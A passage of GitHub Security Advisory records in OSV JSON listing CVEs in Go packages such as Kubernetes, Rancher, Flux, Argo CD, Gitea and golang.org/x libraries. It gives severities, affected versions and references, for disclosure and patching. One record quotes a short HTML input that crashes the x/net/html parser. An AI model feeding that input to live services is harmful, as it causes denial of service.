["CVE-2019-11250"], "summary": "Kubernetes client-go library logs may disclose credentials to unauthorized users", "details": "The Kubernetes client-go library logs request headers at verbosity levels of 7 or higher. This can disclose credentials to unauthorized users via logs or command output. Kubernetes components (such as kube-apiserver) prior to v1.16.0, which make use of basic or bearer token authentication, and run at high verbosity levels, are affected.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.0"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.0-beta.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11250"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/81114"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/81330"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/4441f1d9c3e94d9a3d93b4f184a591cab02a5245"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4052"}, {"type": "ADVISORY", "url": "https://access.redhat.com/errata/RHSA-2019:4087https://nvd.nist.gov/vuln/detail/CVE-2019-11250"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0065"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190919-0003/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2020/10/16/2"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:35:06Z", "nvd_published_at": "2019-08-29T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wg79-2cgp-qrjm", "modified": "2023-09-18T20:36:07Z", "published": "2022-05-24T17:37:27Z", "aliases": ["CVE-2020-29245"], "summary": "dhowden tag panic due to out-of-bounds read", "details": "Due to improper bounds checking, a number of methods in dhowden tag before 0.0.0-20201120070457-d52dcb253c63 can trigger a panic via `readAtomData` due to attempted out-of-bounds reads. If the package is used to parse user supplied input, this may be used as a vector for a denial of service attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dhowden/tag"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20201120070457-d52dcb253c63"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29245"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/issues/78"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/4b595ed4fac79f467594aa92f8953f90f817116e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/6b18201aa5c5535511802ddfb4e4117686b4866d"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/a92213460e4838490ce3066ef11dc823cdc1740e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/d52dcb253c63a153632bfee5f269dd411dcd8e96"}, {"type": "PACKAGE", "url": "https://github.com/dhowden/tag"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0097"}], "database_specific": {"cwe_ids": ["CWE-129"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:21:12Z", "nvd_published_at": "2020-12-28T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h62f-wm92-2cmw", "modified": "2023-10-02T16:14:52Z", "published": "2022-05-13T01:16:08Z", "aliases": ["CVE-2017-11468"], "summary": "Docker Registry has Allocation of Resources Without Limits or Throttling", "details": "Docker Registry before 2.6.2 in Docker Distribution does not properly restrict the amount of content accepted from a user, which allows remote attackers to cause a denial of service (memory consumption) via the manifest endpoint.\n### Specific Go Packages Affected\ngithub.com/docker/distribution/registry/storage\ngithub.com/docker/distribution/registry/handlers", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/distribution"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.7.0-rc.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-11468"}, {"type": "WEB", "url": "https://github.com/distribution/distribution/pull/2340"}, {"type": "WEB", "url": "https://github.com/docker/distribution/pull/2340"}, {"type": "WEB", "url": "https://github.com/distribution/distribution/commit/91c507a39abfce14b5c8541cf284330e22208c0f"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2017:2603"}, {"type": "PACKAGE", "url": "https://github.com/distribution/distribution"}, {"type": "WEB", "url": "https://github.com/docker/distribution/releases/tag/v2.6.2"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0072"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00047.html"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-07T00:04:08Z", "nvd_published_at": "2017-07-20T23:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4fc7-hc63-7fjg", "modified": "2022-05-02T19:33:34Z", "published": "2022-05-02T19:33:34Z", "aliases": ["CVE-2021-36778"], "summary": "Exposure of repository credentials to external third-party sources in Rancher", "details": "### Impact\nThis issue only happens when the user configures access credentials to a private repository in Rancher inside `Apps & Marketplace > Repositories`. It affects Rancher versions 2.5.0 up to and including 2.5.11 and from 2.6.0 up to and including 2.6.2.\n\nAn insufficient check of the same-origin policy when downloading Helm charts from a configured private repository can lead to exposure of the repository credentials to a third-party provider. This exposure happens when the private repository:\n\n1. Does an HTTP redirect to a third-party repository or external storage provider.\n2. Downloads an icon resource for the chart hosted on a third-party provider.\n\nThe address of the private repository is not leaked, only the credentials are leaked in the HTTP `Authorization` header in base64 format.\n\nWith the patched versions, the default behavior now is to only send the private repository credentials when subdomain or domain hostname match when following the redirect or downloading external resources.\n\n### Patches\nPatched versions include releases 2.5.12, 2.6.3 and later versions.\n\n### Workarounds\n1. Update Rancher to a patched version.\n2. Check the Helm charts in your configured private repository for possible redirects to third-party storage, and for Helm chart icons from third-party sources.\n3. Evaluate any Helm chart that might lead to the mentioned scenario and change affected credentials if deemed necessary.\n\n### References\nInformation about the same-origin check and how to disable it is available in Rancher [documentation](https://rancher.com/docs/rancher/v2.6/en/helm-charts/#repositories).\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.12"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-4fc7-hc63-7fjg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-36778"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1191466"}, {"type": "PACKAGE", "url": "github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-522", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-02T19:33:34Z", "nvd_published_at": "2022-05-02T12:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7pwf-jg34-hxwp", "modified": "2022-05-20T16:58:38Z", "published": "2022-05-20T16:58:38Z", "aliases": ["CVE-2022-24878"], "summary": "Improper path handling in Kustomization files allows for denial of service", "details": "The kustomize-controller enables the use of Kustomize\u2019s functionality when applying Kubernetes declarative state onto a cluster. A malicious user can use a specially crafted `kustomization.yaml` to cause Denial of Service at controller level.\n\nIn multi-tenancy deployments this can lead to multiple tenants not being able to apply their Kustomizations until the malicious `kustomization.yaml` is removed and the controller restarted.\n\n### Impact\n\nWithin the affected versions, users with write access to a Flux source are able to craft a malicious `kustomization.yaml` file which causes the controller to enter an endless loop.\n\n### Patches\n\nThis vulnerability was fixed in kustomize-controller v0.24.0 and included in flux2 v0.29.0 released on 2022-04-20. The changes introduce better handling of Kustomization files blocking references that could lead to endless loops.\n\n### Credits\n\nThe Flux engineering team found and patched this vulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory please open an issue in the [flux2 repository](http://github.com/fluxcd/flux2).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluxcd/kustomize-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.16.0"}, {"fixed": "0.24.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/flux2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.19.0"}, {"fixed": "0.29.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluxcd/flux2/security/advisories/GHSA-7pwf-jg34-hxwp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24878"}, {"type": "PACKAGE", "url": "https://github.com/fluxcd/flux2"}], "database_specific": {"cwe_ids": ["CWE-674"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-20T16:58:38Z", "nvd_published_at": "2022-05-06T02:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4r78-hx75-jjj2", "modified": "2023-02-07T22:44:43Z", "published": "2022-05-13T01:19:29Z", "aliases": ["CVE-2018-17847"], "summary": "golang.org/x/net/html has Improper Restriction of Operations within the Bounds of a Memory Buffer", "details": "The html package (aka `x/net/html`) through 2018-09-25 in Go mishandles `<svg><template><desc><t><svg></template>`, leading to a `panic: runtime error` (index out of range) in `(*nodeStack).pop` in node.go, called from `(*parser).clearActiveFormattingElements`, during an `html.Parse` call.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20190125002852-4b62a64f59f7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17847"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/27846"}, {"type": "PACKAGE", "url": "https://github.com/golang/go"}, {"type": "WEB", "url": "https://go.dev/cl/159397"}, {"type": "WEB", "url": "https://go.dev/issue/27846"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/4b62a64f59f73840b9ab79204c94fee61cd1ba2c"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LREEWY6KNLHRWFZ7OT4HVLMVVCGGUHON/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKRCI7WIOCOCD3H7NXWRGIRABTQOZOBK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0197"}], "database_specific": {"cwe_ids": ["CWE-119"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:44:43Z", "nvd_published_at": "2018-10-01T08:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hp87-p4gw-j4gq", "modified": "2023-08-30T13:53:00Z", "published": "2022-05-20T00:00:17Z", "aliases": ["CVE-2022-28948"], "summary": "gopkg.in/yaml.v3 Denial of Service", "details": "An issue in the Unmarshal function in Go-Yaml v3 can cause a program to panic when attempting to deserialize invalid input.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gopkg.in/yaml.v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.0-20220521103104-8f96da9f5d5e"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-28948"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/issues/666"}, {"type": "WEB", "url": "https://github.com/go-yaml/yaml/commit/8f96da9f5d5eff988554c1aae1784627c4bf6754"}, {"type": "PACKAGE", "url": "https://github.com/go-yaml/yaml"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220923-0006/"}], "database_specific": {"cwe_ids": ["CWE-502"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-25T20:17:24Z", "nvd_published_at": "2022-05-19T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j77r-2fxf-5jrw", "modified": "2022-06-02T17:41:47Z", "published": "2022-05-04T18:04:07Z", "aliases": ["CVE-2022-24877"], "summary": "Improper path handling in kustomization files allows path traversal", "details": "The kustomize-controller enables the use of Kustomize\u2019s functionality when applying Kubernetes declarative state onto a cluster. A malicious user can use built-in features and a specially crafted `kustomization.yaml` to expose sensitive data from the controller\u2019s pod filesystem. In multi-tenancy deployments this can lead to privilege escalation if the controller's service account has elevated permissions.\n\nWithin the affected versions, users with write access to a Flux source are able to use built-in features to expose sensitive data from the controller\u2019s pod filesystem using a malicious `kustomization.yaml` file.\n\nThis vulnerability was fixed in kustomize-controller v0.24.0 and included in flux2 v0.29.0 released on 2022-04-20. The changes introduce a new Kustomize file system implementation which ensures that all files being handled are contained within the Kustomization working directory, blocking references to any files that do not meet that requirement.\n\nAutomated tooling (e.g. conftest) could be employed as a workaround, as part of a user's CI/CD pipeline to ensure that their `kustomization.yaml` files conform with specific policies, blocking access to sensitive path locations.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluxcd/kustomize-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.24.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/flux2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.29.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluxcd/flux2/security/advisories/GHSA-j77r-2fxf-5jrw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24877"}, {"type": "WEB", "url": "https://github.com/fluxcd/kustomize-controller/commit/f4528fb25d611da94e491346bea056d5c5c3611f"}, {"type": "WEB", "url": "https://github.com/fluxcd/pkg/commit/0ec014baf417fd3879d366a45503a548b9267d2a"}, {"type": "PACKAGE", "url": "github.com/fluxcd/kustomize-controller"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-05-04T18:04:07Z", "nvd_published_at": "2022-05-06T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w45j-f832-hxvh", "modified": "2023-08-29T23:28:42Z", "published": "2022-05-25T19:26:09Z", "aliases": ["CVE-2022-29222"], "summary": "Pion/DLTS Accepts Client Certificates Without CertificateVerify", "details": "### Impact\nA DTLS Client could provide a Certificate that it doesn't posses the private key for and Pion DTLS wouldn't reject it. \n\nThis issue affects users that are using Client certificates only. The connection itself is still secure. The Certificate provided by clients can't be trusted when using a Pion DTLS server prior to v2.1.5\n\n### Patches\nUpgrade to Pion DTLS v2.1.5\n\n### Workarounds\nNo workarounds available, upgrade to Pion DTLS v2.1.5\n\n### References\nThank you to [Juho Nurminen](https://github.com/jupenur) and the Mattermost team for discovering and reporting this. \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Pion DTLS](http://github.com/pion/dtls)\n* Email us at [team@pion.ly](mailto:team@pion.ly)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pion/dtls"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pion/dtls/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pion/dtls/security/advisories/GHSA-w45j-f832-hxvh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29222"}, {"type": "WEB", "url": "https://github.com/pion/dtls/commit/d2f797183a9f044ce976e6df6f362662ca722412"}, {"type": "WEB", "url": "https://github.com/pion/dtls/releases/tag/v2.1.5"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0462"}, {"type": "PACKAGE", "url": "github.com/pion/dtls"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-25T19:26:09Z", "nvd_published_at": "2022-05-21T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r5c5-pr8j-pfp7", "modified": "2023-09-29T15:47:38Z", "published": "2022-05-24T16:45:25Z", "aliases": ["CVE-2019-11840"], "summary": "golang.org/x/crypto/salsa20/salsa uses insufficiently random values", "details": "An issue was discovered in supplementary Go cryptography libraries, aka golang-googlecode-go-crypto, before 2019-03-20. A flaw was found in the amd64 implementation of golang.org/x/crypto/salsa20 and golang.org/x/crypto/salsa20/salsa. If more than 256 GiB of keystream is generated, or if the counter otherwise grows greater than 32 bits, the amd64 implementation will first generate incorrect output, and then cycle back to previously generated keystream. Repeated keystream bytes can lead to loss of confidentiality in encryption applications, or to predictability in CSPRNG applications.\n\n### Specific Go Packages Affected\ngolang.org/x/crypto/salsa20/salsa", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20190320223903-b7391e95e576"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-11840"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/30965"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1691529"}, {"type": "PACKAGE", "url": "https://github.com/golang/go"}, {"type": "WEB", "url": "https://go.dev/cl/168406"}, {"type": "WEB", "url": "https://go.dev/issue/30965"}, {"type": "WEB", "url": "https://go.googlesource.com/crypto/+/b7391e95e576cacdcdd422573063bc057239113d"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!msg/golang-announce/tjyNcJxb2vQ/n0NRBziSCAAJ"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/tjyNcJxb2vQ/m/n0NRBziSCAAJ"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2019/06/msg00029.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/10/msg00014.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/11/msg00016.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/11/msg00030.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2021/01/msg00015.html"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/06/msg00017.html"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0209"}], "database_specific": {"cwe_ids": ["CWE-330"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:33:46Z", "nvd_published_at": "2019-05-09T16:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xmg8-99r8-jc2j", "modified": "2022-05-24T12:26:59Z", "published": "2022-05-24T12:26:59Z", "aliases": ["CVE-2022-24905"], "summary": "Login screen allows message spoofing if SSO is enabled", "details": "### Impact\n\nA vulnerability was found in Argo CD that allows an attacker to spoof error messages on the login screen when SSO is enabled.\n\nIn order to exploit this vulnerability, an attacker would have to trick the victim to visit a specially crafted URL which contains the message to be displayed.\n\nAs far as the research of the Argo CD team concluded, it is not possible to specify any active content (e.g. Javascript) or other HTML fragments (e.g. clickable links) in the spoofed message.\n\n### Patched versions\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.4\n* v2.2.9\n* v2.1.15\n\n### Workarounds\n\nNo workaround available.\n\n#### Mitigations\n\nIt is advised to update to an Argo CD version containing a fix for this issue (see *Patched versions* above).\n\n### Credits\n\nThis vulnerability was discovered by Naufal Septiadi (<naufal@horangi.com>) and reported to us in a responsible way. \n\n### For more information\n\n<!-- Use only one of the paragraphs below. Remove all others. -->\n\n<!-- For Argo CD -->\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.15"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.7"}}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-xmg8-99r8-jc2j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24905"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.1.15"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.2.9"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.3.4"}, {"type": "PACKAGE", "url": "github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-24T12:26:59Z", "nvd_published_at": "2022-05-20T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wp7w-vx86-vj9h", "modified": "2023-07-21T21:42:33Z", "published": "2022-05-13T01:34:58Z", "aliases": ["CVE-2018-10856"], "summary": "Podman Elevated Container Privileges", "details": "It has been discovered that podman before version 0.6.1 does not drop capabilities when executing a container as a non-root user. This results in unnecessary privileges being granted to the container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-10856"}, {"type": "WEB", "url": "https://github.com/projectatomic/libpod/commit/bae80a0b663925ec751ad2784ca32989403cdc24"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:2037"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-10856"}], "database_specific": {"cwe_ids": ["CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-21T21:42:33Z", "nvd_published_at": "2018-07-03T01:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q4rr-64r9-fwgf", "modified": "2023-09-28T20:26:03Z", "published": "2022-05-13T01:21:42Z", "aliases": ["CVE-2019-1002100"], "summary": "Kubernetes DoS Vulnerability", "details": "In all Kubernetes versions prior to v1.11.8, v1.12.6, and v1.13.4, users that are authorized to make patch requests to the Kubernetes API Server can send a specially crafted patch of type \"json-patch\" (e.g. `kubectl patch --type json` or `\"Content-Type: application/json-patch+json\"`) that consumes excessive resources while processing, causing a Denial of Service on the API Server.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0"}, {"last_affected": "1.10"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.11.7"}}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.12.5"}}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.13.3"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1002100"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/74534"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:1851"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3239"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-announce/vmUUNkYfG9g"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190416-0002/"}, {"type": "WEB", "url": "https://web.archive.org/web/20210125011246/https://www.securityfocus.com/bid/107290/"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-19T18:22:43Z", "nvd_published_at": "2019-04-01T14:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6h8c-gw33-cjm2", "modified": "2023-10-19T18:23:22Z", "published": "2022-05-24T17:24:14Z", "aliases": ["CVE-2020-15391"], "summary": "DevSpace vulnerable to remote code execution", "details": "The UI in DevSpace 4.13.0 allows web sites to execute actions on pods (on behalf of a victim) because of a lack of authentication for the WebSocket protocol. This leads to remote code execution.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/loft-sh/devspace"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.14.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 4.13.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15391"}, {"type": "WEB", "url": "https://github.com/devspace-sh/devspace/issues/1128"}, {"type": "WEB", "url": "https://github.com/devspace-cloud/devspace/releases/tag/v4.14.0"}, {"type": "PACKAGE", "url": "https://github.com/devspace-sh/devspace"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-306"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-10-19T18:23:22Z", "nvd_published_at": "2020-07-23T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ph3w-2843-72mx", "modified": "2022-06-02T20:36:41Z", "published": "2022-05-30T00:00:30Z", "aliases": ["CVE-2022-1928"], "summary": "Stored Cross-site Scripting in gitea", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository go-gitea/gitea prior to 1.16.9 via unfiltered pdfs", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1928"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/19825"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/65e0688a5c9dacad50e71024b7529fdf0e3c2e9c"}, {"type": 